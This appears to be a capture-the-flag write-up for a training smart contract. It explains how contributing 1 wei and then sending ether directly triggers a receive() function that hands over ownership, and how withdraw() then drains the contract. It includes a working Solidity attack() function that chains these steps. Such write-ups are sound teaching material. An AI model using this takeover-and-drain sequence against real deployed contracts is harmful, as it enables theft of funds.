# Requirements

- Claim ownership of the contract
- Reduce its balance to 0

# Attack explanation

To claim ownership, we need to search places where the owner is set and we could exploit some vulnerability. Receive function is ideal for this:

```
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender; // HERE!!
}
```

For being able to trigger receive function, we will need to contribute with some eth to the contract. We will need to call contribute function with at least 1 wei.

```
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

Once we've done our contribution, we will be able to trigger receive function, becoming owners of the contract. When this happens, we will be able to withdraw all funds from the contract, calling withdraw function.

```
function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
}
```

# Attack function

We could solve the challenge by using the following attack function:

```
function attack() public payable {
    // Contribute first time so we can use receive later.
    require(msg.value >= 2 wei, "Need to send at least 2 wei.");
    vulnerableScAddress.call{value: 1 wei}(
        abi.encodeWithSignature("contribute()")
    );

    // Trigger receive vulnerability to claim ownership.
    vulnerableScAddress.call{value: 1 wei}("");

    // Now that we are owners, withdraw all funds.
    vulnerableScAddress.call(abi.encodeWithSignature("withdraw()"));
}
```
